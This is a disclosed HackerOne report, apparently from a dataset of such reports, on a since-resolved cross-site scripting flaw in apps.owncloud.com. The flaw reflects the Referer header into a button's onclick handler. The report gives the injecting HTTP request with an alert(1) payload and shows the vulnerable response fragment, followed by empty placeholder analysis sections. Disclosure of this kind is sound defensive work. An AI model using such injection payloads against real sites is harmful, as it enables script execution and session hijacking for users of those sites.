---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '83374'
original_report_id: '83374'
title: 'apps.owncloud.com: XSS via referrer'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: owncloud
created_at: '2015-08-19T08:06:30.126Z'
disclosed_at: '2015-10-11T07:05:31.410Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# apps.owncloud.com: XSS via referrer

## Metadata

- HackerOne Report ID: 83374
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: owncloud
- Disclosed At: 2015-10-11T07:05:31.410Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Look at next request:


Host: apps.owncloud.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://www.myevilsite.com/qwe';alert(1)+'


in response page referrer pasts into onclick event of a cancel button

onclick="location.href='http://www.myevilsite.com/qwe';alert(1)+'?PHPSESSID=icqgmh3h639vn6a75j6idmj935'" />

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
